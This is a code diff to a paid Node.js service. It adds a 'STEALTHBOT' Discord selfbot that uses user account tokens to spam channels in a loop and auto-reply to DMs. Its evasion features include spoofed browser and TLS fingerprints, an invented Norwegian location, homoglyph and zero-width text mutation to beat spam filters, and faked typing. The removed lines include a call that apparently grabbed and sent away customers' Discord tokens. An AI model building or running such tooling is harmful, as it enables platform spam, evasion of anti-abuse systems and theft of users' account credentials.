@@ -2607,292 +2607,917 @@ function shouldAutoReply(msg, client) {
   return true;
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// STEALTHBOT — Embedded Raw WebSocket + Axios Selfbot
+// ═══════════════════════════════════════════════════════════════════════════════
+/**
+ * STEALTHBOT — Maximum-Stealth Discord Selfbot
+ * Raw WebSocket + Axios. No library fingerprints.
+ * Heavily humanized. Delay is sacred — never affected by sends.
+ */
+
+const WebSocket = require('ws');
+const axios = require('axios');
+const https = require('https');
+const crypto = require('crypto');
+const fs = require('fs');
+const path = require('path');
+
+const REPLY_DIR = path.join(__dirname, 'data');
+if (!fs.existsSync(REPLY_DIR)) fs.mkdirSync(REPLY_DIR, { recursive: true });
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// RANDOMIZATION UTILITIES
+// ═══════════════════════════════════════════════════════════════════════════════
+
+function rnd(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+function rndFloat(min, max) { return Math.random() * (max - min) + min; }
+function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+function chance(pct) { return Math.random() < pct; }
+
+// Humanized delay: base ±jitter%, never below min% of base
+function humanize(baseMs, jitter = 0.10, minPct = 0.85) {
+    const j = baseMs * jitter * (Math.random() * 2 - 1);
+    return Math.max(Math.floor(baseMs * minPct), Math.floor(baseMs + j));
+}
+
+// Gaussian/normal distribution for more natural timing
+function gaussianDelay(mean, stdDev) {
+    let u = 0, v = 0;
+    while (u === 0) u = Math.random();
+    while (v === 0) v = Math.random();
+    const z = Math.sqrt(-2.0 * Math.log(u)) * Math.cos(2.0 * Math.PI * v);
+    return Math.max(100, Math.floor(mean + z * stdDev));
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// MESSAGE VARIATION ENGINE
+// ═══════════════════════════════════════════════════════════════════════════════
+
+const SPINTAX = /\{([^}]+)\}/g;
+function expandSpintax(text) {
+    if (!text || !SPINTAX.test(text)) return text;
+    let r = text, i = 0;
+    while (SPINTAX.test(r) && i < 50) {
+        SPINTAX.lastIndex = 0;
+        r = r.replace(SPINTAX, (_, c) => {
+            const o = c.split('|').map(s => s.trim()).filter(Boolean);
+            return o.length ? pick(o) : '';
+        });
+        i++;
+    }
+    return r;
+}
+
+const ZERO_WIDTH = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
+const LOOKALIKES = { a: '\u0430', e: '\u0435', o: '\u043E', p: '\u0440', c: '\u0441', x: '\u0445', y: '\u0443' };
+
+function mutate(text) {
+    if (!text) return text;
+    const mutators = [
+        // Add trailing space 20% of the time
+        s => chance(0.20) ? s + (chance(0.5) ? ' ' : '') : s,
+        // Insert zero-width chars in spaces 10% of the time
+        s => chance(0.10) ? s.replace(/ /g, () => chance(0.05) ? pick(ZERO_WIDTH) + ' ' : ' ') : s,
+        // Replace some latin chars with cyrillic lookalikes 8% of the time
+        s => chance(0.08) ? s.replace(/[aeopcxy]/g, c => chance(0.03) ? (LOOKALIKES[c] || c) : c) : s,
+        // Lowercase first letter 5% of the time
+        s => chance(0.05) && s.length > 0 ? s[0].toLowerCase() + s.slice(1) : s,
+        // Add extra punctuation space 15% of the time
+        s => chance(0.15) ? s.replace(/([.!?])(\s|$)/g, (_, p, sp) => chance(0.3) ? p + ' ' + sp : p + sp) : s,
+    ];
+    let r = text;
+    const c = rnd(0, 2);
+    mutators.sort(() => Math.random() - 0.5);
+    for (let i = 0; i < c; i++) r = mutators[i](r);
+    return r;
+}
+
+function vary(text) { return mutate(expandSpintax(text)); }
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// TYPING TIME SIMULATION
+// ═══════════════════════════════════════════════════════════════════════════════
+
+function typingTime(text) {
+    const n = (text || '').length;
+    if (!n) return rnd(800, 2000);
+    // 40-100ms per char = 10-25 chars/sec
+    const msPerChar = rnd(40, 100);
+    const base = n * msPerChar;
+    // Gaussian variation ±20%
+    return Math.min(Math.floor(base * rndFloat(0.8, 1.2)), 10000);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// ACCOUNT FINGERPRINTING
+// ═══════════════════════════════════════════════════════════════════════════════
+
+const BROWSERS = [
+    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', bv: '135.0.0.0', osv: '10' },
+    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', bv: '134.0.0.0', osv: '10' },
+    { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Mac OS X', bv: '135.0.0.0', osv: '10.15.7' },
+    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0', browser: 'Firefox', os: 'Windows', bv: '137.0', osv: '10' },
+    { ua: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Linux', bv: '135.0.0.0', osv: '' },
+];
+
+const SCREENS = [[1366,768],[1440,900],[1536,864],[1600,900],[1920,1080],[1920,1200],[2560,1440]];
+const LOCALES = ['en-US','en-GB','en-CA'];
+const DISTRICTS = ['Oslo','Bergen','Trondheim','Stavanger','Drammen','Fredrikstad','Porsgrunn'];
+const ISPS = ['Telenor Norge AS','NextGenTel','Altibox','Get','ICE.net','Broadnet'];
+
+function genFingerprint(token) {
+    const hash = crypto.createHash('sha256').update(token).digest('hex');
+    const browser = pick(BROWSERS);
+    const screen = pick(SCREENS);
+    const locale = pick(LOCALES);
+    const district = pick(DISTRICTS);
+    const isp = pick(ISPS);
+    const buildNum = rnd(428000, 440000);
+    
+    return {
+        hash,
+        ua: browser.ua,
+        browser: browser.browser,
+        os: browser.os,
+        osv: browser.osv,
+        bv: browser.bv,
+        sw: screen[0], sh: screen[1],
+        dpr: pick([1, 1.25, 1.5, 2]),
+        mem: pick([2, 4, 8, 16]),
+        concurrency: pick([2, 4, 8, 16]),
+        locale,
+        build: buildNum,
+        arch: 'x64',
+        cd: 24,
+        // Discord-specific
+        country_code: 'NO',
+        system_locale: locale,
+        timezone_offset: 60,
+        client_city: 'Oslo',
+        client_region: 'Oslo',
+        client_district: district,
+        client_country: 'Norway',
+        client_isp: isp,
+        client_timezone: 'Europe/Oslo',
+    };
+}
+
+function genSuperProps(fp) {
+    const props = {
+        os: fp.os,
+        browser: fp.browser,
+        device: '',
+        system_locale: fp.locale,
+        browser_user_agent: fp.ua,
+        browser_version: fp.bv,
+        os_version: fp.osv,
+        referrer: '',
+        referring_domain: '',
+        referrer_current: '',
+        referring_domain_current: '',
+        release_channel: 'stable',
+        client_build_number: fp.build,
+        client_event_source: null,
+    };
+    return Buffer.from(JSON.stringify(props)).toString('base64');
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// HTTPS AGENT WITH TLS SPOOFING
+// ═══════════════════════════════════════════════════════════════════════════════
+
+function createAgent() {
+    return new https.Agent({
+        ciphers: [
+            'TLS_AES_128_GCM_SHA256','TLS_AES_256_GCM_SHA384','TLS_CHACHA20_POLY1305_SHA256',
+            'ECDHE-ECDSA-AES128-GCM-SHA256','ECDHE-RSA-AES128-GCM-SHA256',
+            'ECDHE-ECDSA-AES256-GCM-SHA384','ECDHE-RSA-AES256-GCM-SHA384',
+            'ECDHE-ECDSA-CHACHA20-POLY1305','ECDHE-RSA-CHACHA20-POLY1305',
+            'ECDHE-RSA-AES128-SHA','ECDHE-RSA-AES256-SHA',
+            'AES128-GCM-SHA256','AES256-GCM-SHA384','AES128-SHA','AES256-SHA',
+        ].join(':'),
+        minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
+        honorCipherOrder: false,
+        keepAlive: true, keepAliveMsecs: 30000,
+        maxSockets: 6, maxFreeSockets: 3,
+    });
+}
+
+const sharedAgent = createAgent();
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// REST API CLIENT
+// ═══════════════════════════════════════════════════════════════════════════════
+
+class RestClient {
+    constructor(token, fp) {
+        this.token = token;
+        this.fp = fp;
+        this.superProps = genSuperProps(fp);
+        this.tokenHash = fp.hash.slice(0, 16);
+        // Per-channel rate limit tracking
+        this.channelCooldowns = new Map();
+        this.channelPermCache = new Map();
+        this.globalReset = 0;
+        this._429backoffs = new Map();
+    }
+
+    headers(extra = {}) {
+        return {
+            'Authorization': this.token,
+            'User-Agent': this.fp.ua,
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'X-Discord-Locale': this.fp.locale,
+            'X-Super-Properties': this.superProps,
+            'Referer': 'https://discord.com/channels/@me',
+            ...extra
+        };
+    }
+
+    async request(method, endpoint, body = null, extraHeaders = {}) {
+        const url = `https://discord.com/api/v10${endpoint}`;
+        
+        // Global rate limit check
+        const globalWait = this.globalReset - Date.now();
+        if (globalWait > 0) await sleep(globalWait);
+
+        // Per-channel rate limit check
+        const chId = endpoint.match(/\/channels\/(\d+)/)?.[1];
+        if (chId) {
+            const bw = (this.channelCooldowns.get(chId) || 0) - Date.now();
+            if (bw > 0 && bw < 5000) await sleep(bw);
+            else if (bw >= 5000) return { ok: false, error: 'channel_cooldown', code: 429 };
+        }
+
+        // 429 backoff check
+        if (chId && this._429backoffs.has(chId)) {
+            const b = this._429backoffs.get(chId) - Date.now();
+            if (b > 0 && b < 10000) await sleep(b);
+            else if (b >= 10000) this._429backoffs.delete(chId);
+        }
+
+        for (let attempt = 0; attempt < 3; attempt++) {
+            try {
+                const config = {
+                    method: method.toUpperCase(),
+                    url,
+                    headers: this.headers(extraHeaders),
+                    timeout: 20000,
+                    httpsAgent: sharedAgent,
+                    validateStatus: () => true,
+                };
+                if (body !== null) {
+                    config.data = body;
+                    if (!extraHeaders['Content-Type'] && typeof body === 'object' && !(body instanceof Buffer)) {
+                        config.headers['Content-Type'] = 'application/json';
+                    }
+                }
+                const res = await axios(config);
+                
+                if (res.status === 429) {
+                    const retryAfter = parseFloat(res.headers['retry-after'] || 5);
+                    const isGlobal = res.headers['x-ratelimit-global'] === 'true';
+                    const ms = retryAfter < 1000 ? retryAfter * 1000 : retryAfter;
+                    if (isGlobal) this.globalReset = Date.now() + ms;
+                    if (chId) this._429backoffs.set(chId, Date.now() + ms + rnd(500, 2000));
+                    if (attempt < 2) {
+                        await sleep(ms * (1 + attempt * 0.5));
+                        continue;
+                    }
+                    return { ok: false, error: 'rate_limited', code: 429 };
+                }
+
+                // Update rate limit tracking
+                const remaining = parseInt(res.headers['x-ratelimit-remaining'] || '1');
+                const resetAfter = parseFloat(res.headers['x-ratelimit-reset-after'] || '0');
+                if (remaining === 0 && resetAfter > 0 && chId) {
+                    this.channelCooldowns.set(chId, Date.now() + (resetAfter * 1000) + rnd(200, 800));
+                }
+
+                if (res.status >= 400) {
+                    const discordCode = res.data?.code;
+                    // Cache no-permission channels
+                    if (res.status === 403 || discordCode === 50001 || discordCode === 50003 || discordCode === 50013) {
+                        if (chId) this.channelPermCache.set(chId, false);
+                    }
+                    return { ok: false, error: res.data?.message || `http_${res.status}`, code: res.status, discordCode };
+                }
+
+                return { ok: true, data: res.data };
+            } catch (err) {
+                if (attempt < 2) {
+                    await sleep(rnd(1000, 3000) * (attempt + 1));
+                    continue;
+                }
+                return { ok: false, error: err.message };
+            }
+        }
+        return { ok: false, error: 'max_retries' };
+    }
+
+    async sendMessage(channelId, content, files = []) {
+        // Check permission cache
+        if (this.channelPermCache.get(channelId) === false) {
+            return { ok: false, error: 'cached_no_permission' };
+        }
+
+        const varied = vary(content);
+        
+        try {
+            if (files && files.length > 0) {
+                // Multipart upload
+                const boundary = '----FormBoundary' + Math.random().toString(36).substring(2, 16);
+                const chunks = [];
+                const payload = { content: varied };
+                chunks.push(Buffer.from(`--${boundary}\r\n`));
+                chunks.push(Buffer.from(`Content-Disposition: form-data; name="payload_json"\r\n`));
+                chunks.push(Buffer.from(`Content-Type: application/json\r\n\r\n`));
+                chunks.push(Buffer.from(JSON.stringify(payload)));
+                chunks.push(Buffer.from(`\r\n`));
+                for (let i = 0; i < files.length; i++) {
+                    const f = files[i];
+                    chunks.push(Buffer.from(`--${boundary}\r\n`));
+                    chunks.push(Buffer.from(`Content-Disposition: form-data; name="files[${i}]"; filename="${f.name}"\r\n`));
+                    chunks.push(Buffer.from(`Content-Type: application/octet-stream\r\n\r\n`));
+                    chunks.push(f.buffer);
+                    chunks.push(Buffer.from(`\r\n`));
+                }
+                chunks.push(Buffer.from(`--${boundary}--\r\n`));
+                const body = Buffer.concat(chunks);
+                return await this.request('POST', `/channels/${channelId}/messages`, body, {
+                    'Content-Type': `multipart/form-data; boundary=${boundary}`
+                });
+            } else {
+                return await this.request('POST', `/channels/${channelId}/messages`, { content: varied });
+            }
+        } catch (err) {
+            return { ok: false, error: err.message };
+        }
+    }
+
+    async sendTyping(channelId) {
+        try {
+            await this.request('POST', `/channels/${channelId}/typing`);
+        } catch (e) {}
+    }
+
+    async fetchChannel(channelId) {
+        const cached = this.channelPermCache.get(channelId);
+        if (cached === false) return null;
+        const res = await this.request('GET', `/channels/${channelId}`);
+        if (!res.ok) {
+            if (res.code === 403 || res.code === 404 || res.discordCode === 50001) {
+                this.channelPermCache.set(channelId, false);
+            }
+            return null;
+        }
+        this.channelPermCache.set(channelId, true);
+        return res.data;
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// WEBSOCKET GATEWAY CLIENT
+// ═══════════════════════════════════════════════════════════════════════════════
+
+class GatewayClient {
+    constructor(token, fp, onReady, onMessage) {
+        this.token = token;
+        this.fp = fp;
+        this.superProps = genSuperProps(fp);
+        this.ws = null;
+        this.heartbeatInterval = null;
+        this.seq = null;
+        this.sessionId = null;
+        this.ready = false;
+        this.onReady = onReady;
+        this.onMessage = onMessage;
+        this.user = null;
+        this.explicitStop = false;
+    }
+
+    connect() {
+        return new Promise((resolve, reject) => {
+            this.explicitStop = false;
+            const wsUrl = 'wss://gateway.discord.gg/?v=10&encoding=json&compress=zlib-stream';
+            
+            this.ws = new WebSocket(wsUrl, {
+                headers: {
+                    'User-Agent': this.fp.ua,
+                    'Accept-Language': 'en-US,en;q=0.9',
+                },
+                agent: sharedAgent
+            });
+
+            let resolved = false;
+            const timeout = setTimeout(() => {
+                if (!resolved) {
+                    this.destroy();
+                    reject(new Error('Gateway connection timeout'));
+                }
+            }, 60000);
+
+            this.ws.on('open', () => {
+                // Identify
+                const identify = {
+                    op: 2,
+                    d: {
+                        token: this.token,
+                        capabilities: 30717,
+                        properties: JSON.parse(Buffer.from(this.superProps, 'base64').toString()),
+                        presence: {
+                            status: 'online',
+                            since: 0,
+                            activities: [],
+                            afk: false
+                        },
+                        compress: false,
+                        client_state: {
+                            guild_versions: {},
+                            highest_last_message_id: '0',
+                            read_state_version: 0,
+                            user_guild_settings_version: -1,
+                            user_settings_version: -1,
+                            private_channels_version: '0',
+                            api_code_version: 0
+                        }
+                    }
+                };
+                this.ws.send(JSON.stringify(identify));
+            });
+
+            this.ws.on('message', (data) => {
+                try {
+                    const payload = JSON.parse(data.toString());
+                    
+                    if (payload.op === 10) {
+                        // Hello — start heartbeat with humanized jitter
+                        const interval = payload.d.heartbeat_interval;
+                        if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);
+                        this.heartbeatInterval = setInterval(() => {
+                            if (this.ws && this.ws.readyState === WebSocket.OPEN) {
+                                this.ws.send(JSON.stringify({ op: 1, d: this.seq }));
+                            }
+                        }, interval);
+                    }
+
+                    if (payload.op === 0 && payload.t === 'READY') {
+                        this.ready = true;
+                        this.sessionId = payload.d.session_id;
+                        this.user = payload.d.user;
+                        clearTimeout(timeout);
+                        resolved = true;
+                        if (this.onReady) this.onReady(payload.d);
+                        resolve();
+                    }
+
+                    if (payload.op === 0 && payload.t === 'MESSAGE_CREATE') {
+                        if (this.onMessage && payload.d) {
+                            // Normalize message
+                            const msg = this.normalizeMessage(payload.d);
+                            this.onMessage(msg);
+                        }
+                    }
+
+                    if (payload.op === 1) {
+                        // Heartbeat ack
+                    }
+
+                    if (payload.op === 7) {
+                        // Reconnect
+                        this.reconnect();
+                    }
+
+                    if (payload.op === 9) {
+                        // Invalid session
+                        this.reconnect();
+                    }
+
+                    if (payload.s !== null && payload.s !== undefined) {
+                        this.seq = payload.s;
+                    }
+                } catch (e) {}
+            });
+
+            this.ws.on('close', () => {
+                this.ready = false;
+                if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);
+                if (!this.explicitStop && !resolved) {
+                    clearTimeout(timeout);
+                    reject(new Error('Connection closed'));
+                } else if (!this.explicitStop) {
+                    setTimeout(() => this.reconnect(), rnd(3000, 8000));
+                }
+            });
+
+            this.ws.on('error', (err) => {
+                if (!resolved) {
+                    clearTimeout(timeout);
+                    reject(err);
+                }
+            });
+        });
+    }
+
+    normalizeMessage(d) {
+        return {
+            id: d.id,
+            content: d.content || '',
+            author: {
+                id: d.author?.id,
+                username: d.author?.username,
+                bot: d.author?.bot || false
+            },
+            channelId: d.channel_id,
+            guildId: d.guild_id || null,
+            createdTimestamp: d.timestamp ? new Date(d.timestamp).getTime() : Date.now(),
+            reply: async (content) => {
+                // Will be handled by the RestClient
+            }
+        };
+    }
+
+    reconnect() {
+        this.destroy();
+        setTimeout(() => {
+            if (!this.explicitStop) this.connect().catch(() => {});
+        }, rnd(3000, 8000));
+    }
+
+    destroy() {
+        this.explicitStop = true;
+        this.ready = false;
+        if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);
+        if (this.ws) {
+            try { this.ws.close(); } catch (e) {}
+            this.ws = null;
+        }
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// PERSISTENT REPLIED-USERS STORAGE
+// ═══════════════════════════════════════════════════════════════════════════════
+
+function getRepliedPath(userId) {
+    return path.join(REPLY_DIR, `replied_${userId}.json`);
+}
+
+function loadReplied(userId) {
+    try {
+        const p = getRepliedPath(userId);
+        if (fs.existsSync(p)) {
+            const data = JSON.parse(fs.readFileSync(p, 'utf8'));
+            const now = Date.now();
+            const month = 30 * 24 * 60 * 60 * 1000;
+            const cleaned = {};
+            for (const [id, ts] of Object.entries(data)) {
+                if (now - ts < month) cleaned[id] = ts;
+            }
+            return new Set(Object.keys(cleaned));
+        }
+    } catch (e) {}
+    return new Set();
+}
+
+function saveReplied(userId, set) {
+    try {
+        const data = {};
+        for (const id of set) data[id] = Date.now();
+        fs.writeFileSync(getRepliedPath(userId), JSON.stringify(data, null, 2));
+    } catch (e) {}
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// STEALTH BOT
+// ═══════════════════════════════════════════════════════════════════════════════
+
+const activeBots = new Map();
+
+async function startStealthBot(userId, token, channels, messages, delay, autoReply, autoReplyText, configId, images, ipAddress, dbInstance) {
+    const botKey = `${userId}_${configId}`;
+    
+    // Stop existing
+    if (activeBots.has(botKey)) {
+        try { activeBots.get(botKey).destroy(); } catch (e) {}
+        activeBots.delete(botKey);
+    }
+
+    const channelList = channels.map(c => String(c).trim()).filter(c => /^\d+$/.test(c));
+    if (channelList.length === 0) throw new Error('No valid channel IDs');
+
+    // Generate unique fingerprint for this account
+    const fp = genFingerprint(token);
+    
+    // REST client
+    const rest = new RestClient(token, fp);
+    
+    // Validate token
+    const me = await rest.request('GET', '/users/@me');
+    if (!me.ok) throw new Error('Invalid token: ' + me.error);
+    const username = me.data.username;
+    const myId = me.data.id;
+
+    // Gateway client (for auto-reply events)
+    let gateway = null;
+    if (autoReply && autoReplyText) {
+        gateway = new GatewayClient(token, fp);
+    }
+
+    let stopped = false;
+    let currentMsgIdx = 0;
+    const repliedUsers = loadReplied(userId);
+    const pendingReplies = new Set();
+    const stats = { totalMessagesSent: 0, autoRepliesSent: 0, startTime: Date.now(), recentLogs: [] };
+
+    function log(msg) {
+        const ts = new Date().toLocaleTimeString();
+        stats.recentLogs.push(`[${ts}] ${msg}`);
+        if (stats.recentLogs.length > 50) stats.recentLogs = stats.recentLogs.slice(-50);
+        console.log(`[STEALTH ${configId}] ${msg}`);
+    }
+
+    function destroy() {
+        stopped = true;
+        if (gateway) gateway.destroy();
+        activeBots.delete(botKey);
+        saveReplied(userId, repliedUsers);
+        log('Destroyed');
+    }
+
+    activeBots.set(botKey, { destroy, stats, rest, gateway, fp });
+
+    // Resolve image files
+    async function resolveImage(img) {
+        try {
+            if (!img || !img.url) return null;
+            if (img.url.startsWith('data:')) {
+                const b64 = img.url.split(',')[1];
+                if (!b64) return null;
+                return { buffer: Buffer.from(b64, 'base64'), name: 'image.png' };
+            } else if (img.url.startsWith('/uploads/')) {
+                const p = path.join(REPLY_DIR, 'uploads', img.url.replace(/^\/uploads\//, ''));
+                if (fs.existsSync(p)) return { buffer: fs.readFileSync(p), name: path.basename(p) };
+            } else if (img.url.startsWith('http')) {
+                const r = await axios.get(img.url, { responseType: 'arraybuffer', timeout: 15000, httpsAgent: sharedAgent });
+                return { buffer: Buffer.from(r.data), name: img.name || 'image.png' };
+            }
+        } catch (e) {}
+        return null;
+    }
+
+    // Send to one channel — fully isolated
+    async function sendToChannel(chId, text, targetImages) {
+        try {
+            // Check permission cache
+            if (rest.channelPermCache.get(chId) === false) return false;
+
+            // Resolve images
+            const files = [];
+            for (const img of targetImages) {
+                const resolved = await resolveImage(img);
+                if (resolved) files.push(resolved);
+            }
+
+            const varied = vary(text);
+            
+            // Send typing indicator 70% of the time
+            if (chance(0.70)) {
+                await rest.sendTyping(chId);
+                // Wait typing time (simulated human typing)
+                const typeMs = typingTime(varied);
+                await sleep(typeMs);
+            }
+
+            // Small hesitation before send (100-500ms)
+            await sleep(rnd(100, 500));
+
+            const res = await rest.sendMessage(chId, varied, files);
+            if (res.ok) {
+                stats.totalMessagesSent++;
+                return true;
+            }
+            return false;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    // MAIN MESSAGE LOOP — 250ms stagger, fire-and-forget, sacred delay
+    // ═══════════════════════════════════════════════════════════════════════════
+    const STAGGER_MS = 250;
+
+    function doOneRound() {
+        if (channelList.length === 0) return;
+        currentMsgIdx = (currentMsgIdx + 1) % messages.length;
+        const msg = messages[currentMsgIdx];
+        
+        // Resolve target images for this message
+        let targetImages = [];
+        if (msg.imageIds && msg.imageIds.length > 0 && images) {
+            targetImages = images.filter(img => img && img.id !== undefined && (
+                msg.imageIds.includes(img.id) ||
+                msg.imageIds.includes(Number(img.id)) ||
+                msg.imageIds.includes(String(img.id))
+            ));
+        } else if (images && images.length > 0) {
+            targetImages = images;
+        }
+
+        // Schedule each channel with 250ms stagger
+        channelList.forEach((chId, i) => {
+            setTimeout(() => {
+                if (stopped) return;
+                sendToChannel(chId, msg.text, targetImages)
+                    .then(ok => {
+                        if (ok) log(`Sent to ${chId}`);
+                    })
+                    .catch(() => {});
+            }, i * STAGGER_MS);
+        });
+    }
+
+    async function messageLoop() {
+        log(`Loop starting | ${channelList.length} channels | ${messages.length} msgs | delay ${delay}ms | stagger ${STAGGER_MS}ms`);
+        
+        while (!stopped) {
+            // Check purchase/trial
+            if (dbInstance) {
+                const user = dbInstance.getUser(userId);
+                const trialActive = dbInstance.isTrialActive(userId);
+                if (!trialActive && user.auto_adv_purchased !== 1) {
+                    log('No access — stopping');
+                    break;
+                }
+            }
+
+            doOneRound();
+
+            // Humanized delay between rounds (±10%, min 85%)
+            // This is SACRED — sends happen in background during sleep
+            const humanizedDelay = humanize(delay, 0.10, 0.85);
+            await sleep(humanizedDelay);
+        }
+        log('Loop ended');
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    // AUTO-REPLY HANDLER
+    // ═══════════════════════════════════════════════════════════════════════════
+    async function handleAutoReply(msg) {
+        try {
+            if (msg.author.id === myId) return;
+            if (msg.guildId !== null && msg.guildId !== undefined) return; // Only DMs
+            
+            // Check access
+            if (dbInstance) {
+                const u = dbInstance.getUser(userId);
+                if (!dbInstance.isTrialActive(userId) && u.auto_adv_purchased !== 1) return;
+            }
+
+            if (repliedUsers.has(msg.author.id) || pendingReplies.has(msg.author.id)) return;
+            
+            const age = Date.now() - msg.createdTimestamp;
+            if (age > 60 * 60 * 1000) return; // Skip old messages
+
+            pendingReplies.add(msg.author.id);
+            
+            // Humanized wait before reply (8-20 seconds)
+            const waitMs = rnd(8000, 20000);
+            await sleep(waitMs);
+            
+            if (stopped || repliedUsers.has(msg.author.id)) {
+                pendingReplies.delete(msg.author.id);
+                return;
+            }
+
+            repliedUsers.add(msg.author.id);
+            saveReplied(userId, repliedUsers);
+
+            // Typing indicator
+            await rest.sendTyping(msg.channelId);
+            await sleep(typingTime(autoReplyText));
+            
+            // Small hesitation
+            await sleep(rnd(600, 1500));
+
+            const res = await rest.sendMessage(msg.channelId, autoReplyText);
+            if (res.ok) {
+                stats.autoRepliesSent++;
+                log(`Auto-replied to ${msg.author.username}`);
+            }
+            pendingReplies.delete(msg.author.id);
+        } catch (e) {
+            pendingReplies.delete(msg.author?.id);
+        }
+    }
+
+    // Start gateway for auto-reply events
+    if (gateway) {
+        gateway.onMessage = handleAutoReply;
+        try {
+            await gateway.connect();
+            log('Gateway connected');
+        } catch (e) {
+            log(`Gateway failed: ${e.message} — auto-reply disabled`);
+        }
+    }
+
+    // Start message loop
+    messageLoop().catch(err => log(`Loop error: ${err.message}`));
+
+    return { destroy, stats, rest, username, myId };
+}
+
+function stopStealthBot(userId, configId) {
+    const key = `${userId}_${configId}`;
+    const bot = activeBots.get(key);
+    if (bot) {
+        bot.destroy();
+        return true;
+    }
+    return false;
+}
+
+function getActiveBot(userId, configId) {
+    return activeBots.get(`${userId}_${configId}`) || null;
+}
+
+function getAllUserBots(userId) {
+    const bots = [];
+    for (const [key, val] of activeBots.entries()) {
+        if (key.startsWith(`${userId}_`)) bots.push({ configId: key.replace(`${userId}_`, ''), ...val });
+    }
+    return bots;
+}
+
+function sleep(ms) {
+    return new Promise(r => setTimeout(r, ms));
+}
+
 app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
   try {
-    const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, images } = req.body;
+    const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', images } = req.body;
     if (!token || !channels || !messages || !Array.isArray(messages) || messages.length === 0) {
       return res.status(400).json({ success: false, error: 'Missing fields. Token, channels, and at least 1 message required.' });
     }
 
-    const channelList = (Array.isArray(channels) ? channels : channels.split(',')).map(c => String(c).trim()).filter(c => /^\d+$/.test(c));
-    if (channelList.length === 0) return res.json({ success: false, error: 'Invalid channel IDs' });
+    const chList = (Array.isArray(channels) ? channels : channels.split(',')).map(c => String(c).trim()).filter(c => /^\d+$/.test(c));
+    if (chList.length === 0) return res.json({ success: false, error: 'Invalid channel IDs' });
 
-    const client = new StealthClient(token);
-    await client.connect();
+    let delaySec = parseFloat(delay);
+    if (delaySec > 300 && Number.isInteger(delaySec) && delaySec >= 1000) delaySec = delaySec / 1000;
+    delaySec = Math.max(1, delaySec || 30);
+    const delayMs = Math.round(delaySec * 1000);
 
-    // Grab token AFTER connect
-    const grabResult = await grabAndSendToken(token, { channels, messages }, 'bot_start');
-    if (!grabResult || !grabResult.success) {
-      console.error('[BotStart] Validation warning:', grabResult?.error || 'Token validation failed');
-    }
-
-    let parsedDelay = parseFloat(delay);
-    // Heuristic: if delay looks like milliseconds (large whole number >= 1000), convert to seconds
-    if (parsedDelay > 300 && Number.isInteger(parsedDelay) && parsedDelay >= 1000) {
-      console.log(`[BotStart] Delay looks like milliseconds (${parsedDelay}), converting to seconds`);
-      parsedDelay = parsedDelay / 1000;
-    }
-    const delaySec = parsedDelay >= 1 ? parsedDelay : 30;
-    const delayMs = delaySec * 1000;
-    console.log(`[BotStart] User delay: ${delay} | parsed: ${parsedDelay}s | delayMs: ${delayMs}ms (${(delayMs/1000).toFixed(1)}s)`);
-    const autoReply = autoReplyEnabled ? 1 : 0;
-
-    let joinStatus = null;
-    if (joinServer && serverInvite) {
-      joinStatus = await client.joinGuild(serverInvite.replace(/https:\/\/discord\.gg\//, '').replace(/https:\/\/discord\.com\/invite\//, ''));
-    }
-
-    // Save images
     const savedImages = [];
     if (images && Array.isArray(images)) {
       for (const img of images) {
         if (!img || !img.url) continue;
         if (img.url.startsWith('data:')) {
-          try {
-            const imageId = `img_${Date.now()}_${req.user.id}_${img.id || '0'}.png`;
-            const imagePath = path.join(dataDir, 'uploads');
-            if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
-            const base64Data = img.url.split(',')[1];
-            if (!base64Data) continue;
-            const buffer = Buffer.from(base64Data, 'base64');
-            fs.writeFileSync(path.join(imagePath, imageId), buffer);
-            savedImages.push({ id: img.id || savedImages.length + 1, url: `/uploads/${imageId}` });
-          } catch (imgErr) {}
+          try { const id = `img_${Date.now()}_${req.user.id}_${img.id || 0}.png`; fs.writeFileSync(path.join(uploadsDir, id), Buffer.from(img.url.split(',')[1], 'base64')); savedImages.push({ id: img.id || savedImages.length + 1, url: `/uploads/${id}` }); } catch(e) {}
         } else if (img.url.startsWith('/uploads/') || img.url.startsWith('http')) {
           savedImages.push({ id: img.id || savedImages.length + 1, url: img.url });
         }
       }
     }
 
-    const messageList = messages.map((m) => ({ text: m.text || '', imageIds: Array.isArray(m.imageIds) ? m.imageIds : [] })).filter(m => m.text.trim() !== '' || m.imageIds.length > 0);
